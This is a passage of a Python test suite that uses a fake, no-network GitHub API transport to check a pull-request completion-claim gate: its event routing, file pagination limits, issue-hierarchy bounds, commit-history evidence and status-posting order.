#!/usr/bin/env python3
"""Hermetic tests for the trusted live completion-claim adapter."""

from __future__ import annotations

import ast
import copy
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import re
import sys
import tempfile
import types
import unittest
from unittest import mock

SCRIPT_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPT_DIR.parent
FIXTURE_DIR = SCRIPT_DIR / "testdata" / "completion_claim_live"
LIVE_PATH = SCRIPT_DIR / "completion_claim_live.py"
WORKFLOW_PATH = REPO_ROOT / ".github" / "workflows" / "completion_claim_live.yml"
CI_PATH = REPO_ROOT / ".github" / "workflows" / "lean_action_ci.yml"
sys.path.insert(0, str(SCRIPT_DIR))

import completion_claim_gate as offline  # noqa: E402
import completion_claim_live as live  # noqa: E402

REPOSITORY = "phasetr/ising-model"
BASE_SHA = "0" * 40
HEAD_SHA = "1" * 40
HISTORY_SHA = "2" * 40
PARENT_SHA = "3" * 40


def fixture(name: str) -> dict[str, object]:
    """Load one tracked incident fixture."""
    return json.loads((FIXTURE_DIR / name).read_text(encoding="utf-8"))


def managed_body(
    paths: list[str],
    *,
    draft: bool = False,
    head_sha: str = HEAD_SHA,
    history: list[dict[str, object]] | None = None,
    references: list[str] | None = None,
) -> str:
    """Return one phase-1-valid body for the supplied trusted facts."""
    payload = {
        "schema_version": 1,
        "candidate": {
            "base_sha": BASE_SHA,
            "head_sha": head_sha,
            "changed_file_count": len(paths),
            "sorted_path_digest": offline.sorted_path_digest(paths),
        },
        "claim_levels": ["exact_candidate_diff"],
        "review_records": [
            {
                "kind": "source_review",
                "head_sha": head_sha,
                "url": "https://github.com/phasetr/ising-model/issues/4801#issuecomment-1",
            },
            {
                "kind": "issue_resolution_audit",
                "head_sha": head_sha,
                "url": "https://github.com/phasetr/ising-model/issues/4801#issuecomment-2",
            },
        ],
        "references": {
            "non_closing": (
                ["Refs #4801", "Part of #4796"]
                if references is None
                else references
            ),
            "closing": [],
        },
        "history_claims": history or [],
        "semantic_claims": [],
    }
    if draft:
        payload["review_records"][0]["head_sha"] = "PENDING"
        payload["review_records"][0]["url"] = "PENDING"
    encoded = json.dumps(payload, indent=2, sort_keys=True)
    return f"```completion-claims-v1\n{encoded}\n```\n\nRefs #4801\nPart of #4796\n"


def pr_data(
    paths: list[str],
    *,
    body: str | None = None,
    draft: bool = False,
    state: str = "open",
    head_sha: str = HEAD_SHA,
    head_repository: str = REPOSITORY,
    actor: str = "phasetr",
) -> dict[str, object]:
    """Return a complete mocked pull-request response."""
    return {
        "number": 4805,
        "state": state,
        "draft": draft,
        "body": managed_body(paths, draft=draft) if body is None else body,
        "changed_files": len(paths),
        "base": {"sha": BASE_SHA, "ref": "main"},
        "head": {
            "sha": head_sha,
            "repo": {"full_name": head_repository},
            "user": {"login": actor},
        },
        "base_repo": {"full_name": REPOSITORY},
    }


class FakeTransport:
    """Scripted no-network REST transport."""

    def __init__(
        self,
        prs: list[dict[str, object]],
        paths: list[str],
        *,
        parents: dict[int, int | None] | None = None,
        backfill: list[int] | None = None,
    ) -> None:
        self.prs = [copy.deepcopy(item) for item in prs]
        self.paths = list(paths)
        self.parents = parents or {4801: 4796, 4796: None}
        self.backfill = backfill or []
        self.pr_reads = 0
        self.gets: list[str] = []
        self.posts: list[tuple[str, dict[str, object]]] = []
        self.events: list[tuple[str, str]] = []
        self.fail_get: dict[str, Exception] = {}
        self.fail_post_at: set[int] = set()
        self.file_overrides: dict[int, list[dict[str, str]]] = {}
        self.commit_data: dict[str, dict[str, object]] = {}
        self.commit_files: dict[str, list[dict[str, str]]] = {}
        self.content_exists: set[tuple[str, str]] = set()
        self.content_blobs: dict[tuple[str, str], str] = {}
        self.compare_status: dict[tuple[str, str], str] = {}
        self.issue_overrides: dict[int, dict[str, object]] = {}
        self.parent_overrides: dict[int, object] = {}

    def get(self, path: str, *, allow_not_found: bool = False) -> object:
        """Return one scripted response."""
        self.gets.append(path)
        self.events.append(("get", path))
        if path in self.fail_get:
            raise self.fail_get[path]
        pr_match = re.fullmatch(r"/repos/phasetr/ising-model/pulls/([1-9][0-9]*)", path)
        if pr_match:
            index = min(self.pr_reads, len(self.prs) - 1)
            self.pr_reads += 1
            return copy.deepcopy(self.prs[index])
        files_match = re.fullmatch(
            r"/repos/phasetr/ising-model/pulls/[1-9][0-9]*/files"
            r"\?per_page=100&page=([1-9][0-9]*)",
            path,
        )
        if files_match:
            page = int(files_match.group(1))
            if page in self.file_overrides:
                return copy.deepcopy(self.file_overrides[page])
            start = (page - 1) * 100
            return [{"filename": name} for name in self.paths[start : start + 100]]
        issue_match = re.fullmatch(
            r"/repos/phasetr/ising-model/issues/([1-9][0-9]*)", path
        )
        if issue_match:
            number = int(issue_match.group(1))
            if number not in self.parents:
                raise live.LiveGateError("ISSUE_NOT_FOUND")
            return copy.deepcopy(
                self.issue_overrides.get(
                    number,
                    {
                        "number": number,
                        "state": "open",
                        "repository_url": f"{live.API_BASE}/repos/{REPOSITORY}",
                    },
                )
            )
        parent_match = re.fullmatch(
            r"/repos/phasetr/ising-model/issues/([1-9][0-9]*)/parent", path
        )
        if parent_match:
            number = int(parent_match.group(1))
            if number in self.parent_overrides:
                return copy.deepcopy(self.parent_overrides[number])
            parent = self.parents.get(number)
            if parent is None:
                return None
            return {
                "number": parent,
                "state": "open",
                "repository_url": f"{live.API_BASE}/repos/{REPOSITORY}",
            }
        commit_match = re.fullmatch(
            r"/repos/phasetr/ising-model/commits/([0-9a-f]{40})"
            r"(?:\?per_page=(1|100)&page=([1-9][0-9]*))?",
            path,
        )
        if commit_match:
            sha = commit_match.group(1)
            if sha not in self.commit_data:
                raise live.LiveGateError("COMMIT_NOT_FOUND")
            response = copy.deepcopy(self.commit_data[sha])
            if commit_match.group(2) is not None:
                per_page = int(commit_match.group(2))
                page = int(commit_match.group(3))
                start = (page - 1) * per_page
                response["files"] = copy.deepcopy(
                    self.commit_files.get(sha, [])[start : start + per_page]
                )
            return response
        compare_match = re.fullmatch(
            r"/repos/phasetr/ising-model/compare/([0-9a-f]{40})"
            r"\.\.\.([0-9a-f]{40})",
            path,
        )
        if compare_match:
            key = (compare_match.group(1), compare_match.group(2))
            return {"status": self.compare_status.get(key, "ahead")}
        content_match = re.fullmatch(
            r"/repos/phasetr/ising-model/contents/(.+)\?ref=([0-9a-f]{40})",
            path,
        )
        if content_match:
            key = (content_match.group(2), content_match.group(1))
            if key in self.content_blobs:
                return {"type": "file", "sha": self.content_blobs[key]}
            if key in self.content_exists:
                blob = "5" * 40 if key[0] == HISTORY_SHA else "6" * 40
                return {"type": "file", "sha": blob}
            if allow_not_found:
                return None
            raise live.LiveGateError("CONTENT_NOT_FOUND")
        list_match = re.fullmatch(
            r"/repos/phasetr/ising-model/pulls\?state=open&base=main"
            r"&per_page=100&page=([1-9][0-9]*)",
            path,
        )
        if list_match:
            page = int(list_match.group(1))
            start = (page - 1) * 100
            return [{"number": number} for number in self.backfill[start : start + 100]]
        raise AssertionError(f"unexpected GET {path}")

    def post(self, path: str, payload: dict[str, object]) -> object:
        """Record one status write."""
        self.events.append(("post", path))
        position = len(self.posts)
        if position in self.fail_post_at:
            raise live.LiveGateError("STATUS_WRITE_FAILED")
        self.posts.append((path, copy.deepcopy(payload)))
        return {"id": position + 1}


class FakeHTTPResponse:
    """Context-managed byte response for the stdlib transport."""

    def __init__(self, data: bytes) -> None:
        self.data = data

    def __enter__(self) -> "FakeHTTPResponse":
        return self

    def __exit__(self, *args: object) -> None:
        del args

    def read(self, amount: int) -> bytes:
        return self.data[:amount]


def checker(exit_code: int):
    """Return a checker stub with phase-1-shaped output."""
    def run(context: object, body: str) -> tuple[int, dict[str, object]]:
        del context, body
        status = "PASS" if exit_code == 0 else "DRAFT_INCOMPLETE"
        return exit_code, {"schema_version": 1, "machine_status": status, "diagnostics": []}

    return run


class FixtureTest(unittest.TestCase):
    def test_fixture_set_is_exact_and_nonempty(self) -> None:
        self.assertEqual(
            {path.name for path in FIXTURE_DIR.glob("*.json")},
            {"baseline.json", "fork.json", "race.json", "history.json"},
        )
        for path in FIXTURE_DIR.glob("*.json"):
            data = json.loads(path.read_text(encoding="utf-8"))
            self.assertTrue(data["id"])
            self.assertTrue(data["repository"])

    def test_baseline_and_fork_fixtures_drive_status_results(self) -> None:
        paths = ["scripts/example.py"]
        for name in ["baseline.json", "fork.json"]:
            with self.subTest(name=name):
                data = fixture(name)
                pr = pr_data(
                    paths,
                    draft=bool(data["draft"]),
                    head_repository=str(data["head_repository"]),
                    actor=str(data["head_actor"]),
                )
                pr["number"] = int(data["pr_number"])
                transport = FakeTransport([pr, pr], paths)
                self.assertEqual(
                    live.evaluate_pr(
                        transport,
                        str(data["repository"]),
                        int(data["pr_number"]),
                        checker(int(data["checker_exit"])),
                    ),
                    0,
                )
                self.assertEqual(
                    transport.posts[-1][1]["state"],
                    data["expected_terminal"],
                )

    def test_race_fixture_drives_p1_p2_failure(self) -> None:
        data = fixture("race.json")
        paths = ["scripts/example.py"]
        p1 = pr_data(paths)
        p2 = pr_data(paths, body=managed_body(paths) + "same-head edit\n")
        p1["number"] = int(data["pr_number"])
        p2["number"] = int(data["pr_number"])
        transport = FakeTransport([p1, p2], paths)
        self.assertEqual(
            live.evaluate_pr(
                transport,
                str(data["repository"]),
                int(data["pr_number"]),
                checker(int(data["checker_exit"])),
            ),
            1,
        )
        self.assertEqual(
            transport.posts[-1][1]["state"],
            data["expected_terminal"],
        )

    def test_history_fixture_drives_primary_evidence(self) -> None:
        data = fixture("history.json")
        history_entry = dict(data["history"][0])
        parent_sha = str(history_entry.pop("parent_sha"))
        claim = {
            "commit_sha": history_entry["commit_sha"],
            "path": history_entry["path"],
            "action": history_entry["action"],
        }
        path = str(claim["path"])
        body = managed_body([path], history=[claim])
        pr = pr_data([path], body=body)
        pr["number"] = int(data["pr_number"])
        transport = FakeTransport([pr, pr], [path])
        commit_sha = str(claim["commit_sha"])
        transport.commit_data[commit_sha] = {
            "sha": commit_sha,
            "parents": [{"sha": parent_sha}],
        }
        transport.commit_data[parent_sha] = {
            "sha": parent_sha,
            "parents": [],
        }
        transport.commit_files[commit_sha] = [
            {
                "filename": path,
                "status": "modified",
                "sha": "5" * 40,
            }
        ]
        transport.compare_status[(commit_sha, HEAD_SHA)] = "ahead"
        transport.content_exists.update(
            {(parent_sha, path), (commit_sha, path)}
        )
        self.assertEqual(
            live.evaluate_pr(
                transport,
                str(data["repository"]),
                int(data["pr_number"]),
            ),
            0,
        )
        self.assertEqual(
            transport.posts[-1][1]["state"],
            data["expected_terminal"],
        )


class RoutingTest(unittest.TestCase):
    def setUp(self) -> None:
        paths = ["scripts/example.py"]
        self.transport = FakeTransport([pr_data(paths)], paths)

    def test_pull_request_target_exact_events_route_one_pr(self) -> None:
        for event_type in live.PR_EVENT_TYPES:
            event = {"action": event_type, "pull_request": {"number": 4805}}
            self.assertEqual(
                live.select_pr_numbers("pull_request_target", event, self.transport, REPOSITORY),
                [4805],
            )
        event = {"action": "labeled", "pull_request": {"number": 4805}}
        with self.assertRaisesRegex(live.LiveGateError, "UNSUPPORTED_EVENT"):
            live.select_pr_numbers("pull_request_target", event, self.transport, REPOSITORY)

    def test_repository_dispatch_accepts_only_positive_integer(self) -> None:
        event = {
            "action": "completion_claim_replay",
            "client_payload": {"pr_number": 4805},
        }
        self.assertEqual(
            live.select_pr_numbers(
                "repository_dispatch", event, self.transport, REPOSITORY
            ),
            [4805],
        )
        for value in [None, "", 0, -1, 1.0, "4805", True]:
            with self.subTest(value=value):
                event["client_payload"]["pr_number"] = value
                with self.assertRaisesRegex(live.LiveGateError, "INVALID_PR_NUMBER"):
                    live.select_pr_numbers(
                        "repository_dispatch", event, self.transport, REPOSITORY
                    )
        with self.assertRaisesRegex(live.LiveGateError, "UNSUPPORTED_EVENT"):
            live.select_pr_numbers(
                "workflow_dispatch",
                {"inputs": {"pr_number": "4805"}},
                self.transport,
                REPOSITORY,
            )

    def test_main_push_backfill_is_bounded_and_complete(self) -> None:
        self.transport.backfill = list(range(1, live.MAX_BACKFILL_PRS + 1))
        self.assertEqual(
            len(live.select_pr_numbers("push", {"ref": "refs/heads/main"},
                                       self.transport, REPOSITORY)),
            live.MAX_BACKFILL_PRS,
        )
        self.transport.backfill.append(live.MAX_BACKFILL_PRS + 1)
        with self.assertRaisesRegex(live.LiveGateError, "BACKFILL_LIMIT_EXCEEDED"):
            live.select_pr_numbers(
                "push", {"ref": "refs/heads/main"}, self.transport, REPOSITORY
            )
        self.transport.backfill = []
        self.assertEqual(
            live.select_pr_numbers(
                "push",
                {"ref": "refs/heads/main"},
                self.transport,
                REPOSITORY,
            ),
            [],
        )

    def test_actor_never_bypasses_routing(self) -> None:
        for actor in ["phasetr", "dependabot[bot]", "github-actions[bot]"]:
            event = {
                "action": "opened",
                "sender": {"login": actor},
                "pull_request": {"number": 4805},
            }
            self.assertEqual(
                live.select_pr_numbers("pull_request_target", event,
                                       self.transport, REPOSITORY),
                [4805],
            )

    def test_non_main_push_and_unknown_event_fail(self) -> None:
        for name, event in [
            ("push", {"ref": "refs/heads/topic"}),
            ("pull_request", {"action": "opened"}),
            ("schedule", {}),
            (
                "repository_dispatch",
                {
                    "action": "other",
                    "client_payload": {"pr_number": 4805},
                },
            ),
        ]:
            with self.subTest(name=name):
                with self.assertRaisesRegex(live.LiveGateError, "UNSUPPORTED_EVENT"):
                    live.select_pr_numbers(
                        name,
                        event,
                        self.transport,
                        REPOSITORY,
                    )


class PaginationTest(unittest.TestCase):
    def collect(self, count: int) -> list[str]:
        paths = [f"p/{index:04d}.txt" for index in range(count)]
        transport = FakeTransport([pr_data(paths or ["placeholder"])], paths)
        return live.collect_changed_paths(transport, REPOSITORY, 4805, count)

    def test_boundaries_one_hundred_one_and_three_thousand(self) -> None:
        for count in [1, 100, 101, 3000]:
            with self.subTest(count=count):
                self.assertEqual(len(self.collect(count)), count)

    def test_zero_count_queries_sentinel_before_failing_empty(self) -> None:
        transport = FakeTransport([pr_data(["placeholder"])], [])
        with self.assertRaisesRegex(live.LiveGateError, "INVALID_CHANGED_PATH"):
            live.collect_changed_paths(transport, REPOSITORY, 4805, 0)
        self.assertEqual(
            transport.gets,
            [f"/repos/{REPOSITORY}/pulls/4805/files?per_page=100&page=1"],
        )

    def test_fixed_sentinel_rejects_underreported_metadata(self) -> None:
        for count in [0, 1, 100, 101, 3000]:
            with self.subTest(count=count):
                paths = [f"p/{index:04d}.txt" for index in range(count)]
                transport = FakeTransport(
                    [pr_data(paths or ["placeholder"])],
                    paths,
                )
                sentinel = (count + live.FILES_PER_PAGE - 1) // live.FILES_PER_PAGE + 1
                transport.file_overrides[sentinel] = [{"filename": "unreported.txt"}]
                with self.assertRaisesRegex(
                    live.LiveGateError,
                    "EXTRA_CHANGED_PATHS",
                ):
                    live.collect_changed_paths(
                        transport,
                        REPOSITORY,
                        4805,
                        count,
                    )

    def test_three_thousand_one_is_rejected_without_fetching(self) -> None:
        transport = FakeTransport([pr_data(["x"])], ["x"])
        with self.assertRaisesRegex(live.LiveGateError, "FILE_LIMIT_EXCEEDED"):
            live.collect_changed_paths(transport, REPOSITORY, 4805, 3001)
        self.assertEqual(transport.gets, [])

    def test_duplicates_missing_extra_and_partial_pages_fail(self) -> None:
        paths = [f"p/{index:03d}.txt" for index in range(101)]
        cases = {
            "duplicate": [{"filename": "p/000.txt"}] * 100,
            "missing": [{"filename": name} for name in paths[:99]],
            "extra": [{"filename": name} for name in paths[:100]]
            + [{"filename": "extra"}],
        }
        for name, page in cases.items():
            with self.subTest(name=name):
                transport = FakeTransport([pr_data(paths)], paths)
                transport.file_overrides[1] = page
                with self.assertRaises(live.LiveGateError):
                    live.collect_changed_paths(
                        transport, REPOSITORY, 4805, len(paths)
                    )
        transport = FakeTransport([pr_data(paths)], paths)
        transport.file_overrides[2] = []
        with self.assertRaisesRegex(live.LiveGateError, "FILE_COUNT_MISMATCH"):
            live.collect_changed_paths(transport, REPOSITORY, 4805, len(paths))


class ContextDerivationTest(unittest.TestCase):
    def test_structured_reference_total_and_uniqueness_are_bounded(self) -> None:
        paths = ["scripts/example.py"]
        expected_maximum = 16
        actual_maximum = getattr(live, "MAX_STRUCTURED_REFERENCES", None)
        maximum = [
            f"Refs #{5000 + index}"
            for index in range(expected_maximum)
        ]
        payload = live.structured_payload(
            managed_body(paths, references=maximum)
        )
        self.assertEqual(
            len(live.structured_references(payload)),
            expected_maximum,
        )
        for references in [
            maximum + ["Refs #9999"],
            ["Refs #4801", "Refs #4801"],
            ["Refs #4801", "Part of #4801"],
            ["Part of #4796"],
        ]:
            with self.subTest(references=references[-2:]):
                payload = live.structured_payload(
                    managed_body(paths, references=references)
                )
                with self.assertRaises(live.LiveGateError):
                    live.structured_references(payload)
        self.assertEqual(actual_maximum, expected_maximum)

    def test_shared_issue_chains_are_memoized_with_bounded_requests(self) -> None:
        paths = ["scripts/example.py"]
        body = managed_body(
            paths,
            references=["Refs #4801", "Refs #4802", "Part of #4796"],
        )
        transport = FakeTransport(
            [pr_data(paths, body=body)],
            paths,
            parents={4801: 4796, 4802: 4796, 4796: None},
        )
        self.assertEqual(
            live.derive_allowed_issue_refs(transport, REPOSITORY, body),
            [4796, 4801, 4802],
        )
        issue_requests = [
            path for path in transport.gets if "/issues/" in path
        ]
        self.assertEqual(len(issue_requests), len(set(issue_requests)))
        self.assertLessEqual(
            len(issue_requests),
            live.MAX_STRUCTURED_REFERENCES + live.MAX_ISSUES,
        )

    def test_issue_hierarchy_is_structural_and_bounded(self) -> None:
        paths = ["scripts/example.py"]
        body = managed_body(paths)
        transport = FakeTransport([pr_data(paths, body=body)], paths)
        self.assertEqual(
            live.derive_allowed_issue_refs(transport, REPOSITORY, body),
            [4796, 4801],
        )
        transport.parents[4796] = 4801
        with self.assertRaisesRegex(live.LiveGateError, "ISSUE_HIERARCHY_CYCLE"):
            live.derive_allowed_issue_refs(transport, REPOSITORY, body)

    def test_unstructured_prose_does_not_expand_issue_authority(self) -> None:
        paths = ["scripts/example.py"]
        body = managed_body(paths) + "See #9999 for unrelated prose.\n"
        transport = FakeTransport([pr_data(paths, body=body)], paths)
        self.assertEqual(
            live.derive_allowed_issue_refs(transport, REPOSITORY, body),
            [4796, 4801],
        )
        self.assertNotIn(
            f"/repos/{REPOSITORY}/issues/9999",
            transport.gets,
        )

    def test_issue_authority_rejects_pr_closed_cross_repo_and_invalid_parent(self) -> None:
        paths = ["scripts/example.py"]
        body = managed_body(paths)
        invalid_issues = [
            {
                "number": 4801,
                "state": "open",
                "repository_url": f"{live.API_BASE}/repos/{REPOSITORY}",
                "pull_request": {"url": "untrusted"},
            },
            {
                "number": 4801,
                "state": "closed",
                "repository_url": f"{live.API_BASE}/repos/{REPOSITORY}",
            },
            {
                "number": 4801,
                "state": "open",
                "repository_url": f"{live.API_BASE}/repos/other/project",
            },
        ]
        for issue in invalid_issues:
            with self.subTest(issue=issue):
                transport = FakeTransport([pr_data(paths)], paths)
                transport.issue_overrides[4801] = issue
                with self.assertRaises(live.LiveGateError):
                    live.derive_allowed_issue_refs(transport, REPOSITORY, body)
        transport = FakeTransport([pr_data(paths)], paths)
        transport.parent_overrides[4801] = {
            "number": 4796,
            "state": "open",
            "repository_url": f"{live.API_BASE}/repos/{REPOSITORY}",
            "pull_request": {"url": "untrusted"},
        }
        with self.assertRaises(live.LiveGateError):
            live.derive_allowed_issue_refs(transport, REPOSITORY, body)

    def test_issue_depth_count_and_history_count_are_bounded(self) -> None:
        paths = ["scripts/example.py"]
        body = managed_body(paths)
        parents = {number: number + 1 for number in range(4801, 4810)}
        parents[4810] = None
        transport = FakeTransport([pr_data(paths, body=body)], paths, parents=parents)
        with self.assertRaisesRegex(live.LiveGateError, "ISSUE_DEPTH_EXCEEDED"):
            live.derive_allowed_issue_refs(transport, REPOSITORY, body)
        too_many = [
            {"commit_sha": HISTORY_SHA, "path": f"p/{index}", "action": "added"}
            for index in range(live.MAX_HISTORY_FACTS + 1)
        ]
        with self.assertRaisesRegex(live.LiveGateError, "HISTORY_LIMIT_EXCEEDED"):
            live.derive_history_facts(
                transport,
                REPOSITORY,
                HEAD_SHA,
                too_many,
            )

    def history_transport(self, action: str) -> tuple[FakeTransport, list[dict[str, object]]]:
        path = "scripts/example.py"
        claim = {"commit_sha": HISTORY_SHA, "path": path, "action": action}
        body = managed_body([path], history=[claim])
        transport = FakeTransport([pr_data([path], body=body)], [path])
        transport.commit_data[HISTORY_SHA] = {
            "sha": HISTORY_SHA,
            "parents": [{"sha": PARENT_SHA}],
        }
        transport.commit_data[PARENT_SHA] = {"sha": PARENT_SHA, "parents": []}
        transport.commit_files[HISTORY_SHA] = [
            {
                "filename": path,
                "status": {
                    "added": "added",
                    "modified": "modified",
                    "deleted": "removed",
                }[action],
                "sha": ("6" if action == "deleted" else "5") * 40,
            }
        ]
        transport.compare_status[(HISTORY_SHA, HEAD_SHA)] = "ahead"
        return transport, [claim]

    def test_history_actions_use_commit_parent_compare_and_content(self) -> None:
        path = "scripts/example.py"
        for action, parent_exists, commit_exists in [
            ("added", False, True),
            ("modified", True, True),
            ("deleted", True, False),
        ]:
            with self.subTest(action=action):
                transport, claims = self.history_transport(action)
                if parent_exists:
                    transport.content_exists.add((PARENT_SHA, path))
                if commit_exists:
                    transport.content_exists.add((HISTORY_SHA, path))
                self.assertEqual(
                    live.derive_history_facts(
                        transport, REPOSITORY, HEAD_SHA, claims
                    ),
                    claims,
                )

    def test_history_reviewer_repro_rejects_unrelated_and_unchanged_blob(self) -> None:
        path = "scripts/example.py"
        transport, claims = self.history_transport("modified")
        transport.commit_files[HISTORY_SHA] = [
            {
                "filename": "scripts/unrelated.py",
                "status": "modified",
                "sha": "5" * 40,
            }
        ]
        transport.content_blobs[(PARENT_SHA, path)] = "5" * 40
        transport.content_blobs[(HISTORY_SHA, path)] = "5" * 40
        with self.assertRaises(live.LiveGateError):
            live.derive_history_facts(transport, REPOSITORY, HEAD_SHA, claims)

        transport, claims = self.history_transport("modified")
        transport.content_blobs[(PARENT_SHA, path)] = "5" * 40
        transport.content_blobs[(HISTORY_SHA, path)] = "5" * 40
        with self.assertRaisesRegex(live.LiveGateError, "HISTORY_BLOB_UNCHANGED"):
            live.derive_history_facts(transport, REPOSITORY, HEAD_SHA, claims)

    def test_history_commit_files_use_bounded_pages_and_empty_sentinel(self) -> None:
        path = "scripts/example.py"
        transport, claims = self.history_transport("modified")
        transport.commit_files[HISTORY_SHA] = [
            {"filename": path, "status": "modified", "sha": "5" * 40}
        ] + [
            {
                "filename": f"scripts/other-{index:03d}.py",
                "status": "modified",
                "sha": f"{index + 10:040x}",
            }
            for index in range(99)
        ]
        transport.content_exists.update(
            {(PARENT_SHA, path), (HISTORY_SHA, path)}
        )
        self.assertEqual(
            live.derive_history_facts(
                transport,
                REPOSITORY,
                HEAD_SHA,
                claims,
            ),
            claims,
        )
        self.assertIn(
            f"/repos/{REPOSITORY}/commits/{HISTORY_SHA}?per_page=100&page=2",
            transport.gets,
        )

        transport, claims = self.history_transport("modified")
        transport.commit_files[HISTORY_SHA] = [
            {
                "filename": f"scripts/file-{index:03d}.py",
                "status": "modified",
                "sha": f"{index + 10:040x}",
            }
            for index in range(live.MAX_HISTORY_FILE_PAGES * 100 + 1)
        ]
        with self.assertRaisesRegex(
            live.LiveGateError,
            "HISTORY_FILE_LIMIT_EXCEEDED",
        ):
            live.derive_history_facts(
                transport,
                REPOSITORY,
                HEAD_SHA,
                claims,
            )

    def test_history_blob_must_match_commit_file_evidence(self) -> None:
        path = "scripts/example.py"
        for action, parent_blob, commit_blob in [
            ("added", None, "7" * 40),
            ("modified", "6" * 40, "7" * 40),
            ("deleted", "7" * 40, None),
        ]:
            with self.subTest(action=action):
                transport, claims = self.history_transport(action)
                if parent_blob is not None:
                    transport.content_blobs[(PARENT_SHA, path)] = parent_blob
                if commit_blob is not None:
                    transport.content_blobs[(HISTORY_SHA, path)] = commit_blob
                with self.assertRaisesRegex(
                    live.LiveGateError,
                    "HISTORY_FILE_BLOB_MISMATCH",
                ):
                    live.derive_history_facts(
                        transport,
                        REPOSITORY,
                        HEAD_SHA,
                        claims,
                    )

    def test_history_rejects_wrong_or_unsupported_commit_file_status(self) -> None:
        for status in ["added", "removed", "renamed", "copied", "unchanged", "unknown"]:
            with self.subTest(status=status):
                transport, claims = self.history_transport("modified")
                transport.commit_files[HISTORY_SHA][0]["status"] = status
                transport.content_exists.update(
                    {(PARENT_SHA, "scripts/example.py"), (HISTORY_SHA, "scripts/example.py")}
                )
                with self.assertRaises(live.LiveGateError):
                    live.derive_history_facts(
                        transport,
                        REPOSITORY,
                        HEAD_SHA,
                        claims,
                    )

    def test_history_rejects_unreachable_merge_and_invalid_root_action(self) -> None:
        transport, claims = self.history_transport("modified")
        transport.compare_status[(HISTORY_SHA, HEAD_SHA)] = "diverged"
        with self.assertRaisesRegex(live.LiveGateError, "HISTORY_UNREACHABLE"):
            live.derive_history_facts(transport, REPOSITORY, HEAD_SHA, claims)
        transport, claims = self.history_transport("modified")
        transport.commit_data[HISTORY_SHA]["parents"] = [
            {"sha": PARENT_SHA},
            {"sha": "4" * 40},
        ]
        with self.assertRaisesRegex(live.LiveGateError, "HISTORY_MERGE_UNSUPPORTED"):
            live.derive_history_facts(transport, REPOSITORY, HEAD_SHA, claims)
        transport, claims = self.history_transport("modified")
        transport.commit_data[HISTORY_SHA]["parents"] = []
        with self.assertRaisesRegex(live.LiveGateError, "HISTORY_ROOT_ACTION"):
            live.derive_history_facts(transport, REPOSITORY, HEAD_SHA, claims)


class EvaluationTest(unittest.TestCase):
    def setUp(self) -> None:
        self.paths = ["scripts/example.py"]
        self.pr = pr_data(self.paths)

    def test_exact_status_payload_sequence_and_head(self) -> None:
        transport = FakeTransport([self.pr, self.pr], self.paths)
        result = live.evaluate_pr(transport, REPOSITORY, 4805, checker(0))
        self.assertEqual(result, 0)
        endpoint = f"/repos/{REPOSITORY}/statuses/{HEAD_SHA}"
        self.assertEqual(
            transport.posts,
            [
                (endpoint, live.status_payload("pending", "PENDING")),
                (endpoint, live.status_payload("success", "PASS")),
            ],
        )
        first_file_get = next(
            index
            for index, event in enumerate(transport.events)
            if "/files?" in event[1]
        )
        pending_post = transport.events.index(
            ("post", f"/repos/{REPOSITORY}/statuses/{HEAD_SHA}")
        )
        self.assertLess(pending_post, first_file_get)

    def test_thousand_duplicate_refs_fail_before_fact_gets_after_pending(self) -> None:
        body = managed_body(
            self.paths,
            references=["Refs #4801"] * 1000,
        )
        pr = pr_data(self.paths, body=body)
        transport = FakeTransport([pr], self.paths)
        self.assertEqual(
            live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)),
            1,
        )
        self.assertFalse(
            any("/issues/" in path or "/files?" in path for path in transport.gets)
        )
        self.assertEqual(
            [payload["state"] for _, payload in transport.posts],
            ["pending", "failure"],
        )

    def test_pending_failure_stops_and_later_network_errors_finalize(self) -> None:
        transport = FakeTransport([self.pr], self.paths)
        transport.fail_post_at.add(0)
        self.assertEqual(
            live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)),
            1,
        )
        self.assertEqual(
            [event for event in transport.events if event[0] == "post"],
            [("post", f"/repos/{REPOSITORY}/statuses/{HEAD_SHA}")],
        )
        self.assertFalse(any("/files?" in path for path in transport.gets))

        for error_code in ["API_RATE_LIMIT", "API_TIMEOUT"]:
            with self.subTest(error_code=error_code):
                transport = FakeTransport([self.pr], self.paths)
                files = (
                    f"/repos/{REPOSITORY}/pulls/4805/files"
                    "?per_page=100&page=1"
                )
                transport.fail_get[files] = live.LiveGateError(error_code)
                self.assertEqual(
                    live.evaluate_pr(
                        transport,
                        REPOSITORY,
                        4805,
                        checker(0),
                    ),
                    1,
                )
                self.assertEqual(
                    [payload["state"] for _, payload in transport.posts],
                    ["pending", "failure"],
                )

    def test_real_offline_ready_passes_and_draft_incomplete_fails(self) -> None:
        ready_transport = FakeTransport([self.pr, self.pr], self.paths)
        self.assertEqual(
            live.evaluate_pr(ready_transport, REPOSITORY, 4805),
            0,
        )
        draft = pr_data(self.paths, draft=True)
        draft_transport = FakeTransport([draft, draft], self.paths)
        self.assertEqual(
            live.evaluate_pr(draft_transport, REPOSITORY, 4805),
            1,
        )
        self.assertEqual(draft_transport.posts[-1][1]["state"], "failure")

    def test_only_exit_zero_can_write_success(self) -> None:
        for exit_code in [1, 2, 3, -1]:
            with self.subTest(exit_code=exit_code):
                transport = FakeTransport([self.pr, self.pr], self.paths)
                self.assertEqual(
                    live.evaluate_pr(
                        transport, REPOSITORY, 4805, checker(exit_code)
                    ),
                    1,
                )
                self.assertEqual(transport.posts[-1][1]["state"], "failure")

    def test_malformed_checker_output_fails(self) -> None:
        transport = FakeTransport([self.pr, self.pr], self.paths)
        bad = lambda context, body: (0, {"machine_status": "DRAFT_INCOMPLETE"})
        self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, bad), 1)
        self.assertEqual(transport.posts[-1][1]["state"], "failure")

    def test_unexpected_checker_exception_fails_on_captured_head(self) -> None:
        transport = FakeTransport([self.pr], self.paths)

        def broken(context: object, body: str) -> tuple[int, dict[str, object]]:
            del context, body
            raise RuntimeError("untrusted checker detail")

        self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, broken), 1)
        endpoint = f"/repos/{REPOSITORY}/statuses/{HEAD_SHA}"
        self.assertEqual(
            transport.posts[-1],
            (
                endpoint,
                live.status_payload("failure", "UNEXPECTED_ADAPTER_ERROR"),
            ),
        )

    def test_p1_p2_each_identity_field_is_compared(self) -> None:
        mutations = {
            "state": "closed",
            "draft": True,
            "body": managed_body(self.paths) + "changed\n",
            "changed_files": 2,
            "base": {"sha": "a" * 40, "ref": "main"},
            "head": {
